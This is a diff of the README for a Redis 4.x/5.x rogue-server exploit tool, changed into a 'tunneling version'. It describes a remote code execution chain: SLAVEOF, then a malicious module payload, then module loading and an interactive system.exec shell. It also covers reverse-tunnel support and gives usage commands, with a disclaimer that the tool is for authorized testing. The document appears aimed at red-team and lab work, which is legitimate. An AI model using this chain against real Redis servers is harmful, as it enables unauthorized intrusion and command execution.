@@ -1,19 +1,52 @@
-# Redis Rogue Server
+# Redis Rogue Server (Tunneling Version)
 
-A exploit for Redis 4.x and 5.x RCE, inspired by [Redis post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf).
+Modified to support for **Red Team operators, CVE research, exploit labs, and controlled penetration testing**:
 
-## Usage:
+[+] Pinggy / Cloudflare Tunnel / Ngrok reverse tunnels  
+[+] Custom **local bind port** (`--bind`)  
 
-Compile .so from <https://github.com/n0b0dyCN/RedisModules-ExecuteCommand>.
 
-Copy the .so file to same folder with `redis-rogue-server.py`.
+> **Disclaimer**  
+> This tool must be used for **authorized security testing only**.  
+> You are fully responsible for how you use this code.
 
-Run the rogue server:
+---
 
+## Features
+
+- Rogue Redis replication server (PSYNC/SYNC handler)
+- Supports modules injection via `<payload.so>`  [RedisModules-ExecuteCommand (fixed module.c error)](https://github.com/netw0rk7/RedisModules-ExecuteCommand) 
+- Works with reverse tunnels (Pinggy, Cloudflare, Ngrok)
+- Configurable **local bind port** (`--bind`)
+- Interactive shell (`system.exec`)
+- Automatic RCE chain:
+  - SLAVEOF → send malicious payload → load module → execute commands
+- Automatic cleanup after exploitation
+
+---
+
+## Requirements
+
+- Python 3.8+
+- Redis target with:
+  - `slaveof` enabled  
+  - `CONFIG SET` enabled  
+- Forwarding tool (optional):
+  - Pinggy  
+  - Cloudflare Tunnel  
+  - Ngrok  
+  - SSH reverse tunnel  
+
+---
+
+## Installation
+
+```bash
+git clone https://github.com/netw0rk7/redis-rogue-server
+cd redis-rogue-server
+python3 redis-rogue.server.py --help
 ```
-python3 redis-rogue-server.py --rhost <target address> --rport <target port> --lhost <vps address> --lport <vps port>
-```
 
-The default target port is 6379 and the default vps port is 21000.
 
-And you will get an interactive shell!
+
+<img width="829" height="700" alt="image" src="https://github.com/user-attachments/assets/71698f11-691e-4824-b82b-2df495d994b4" />
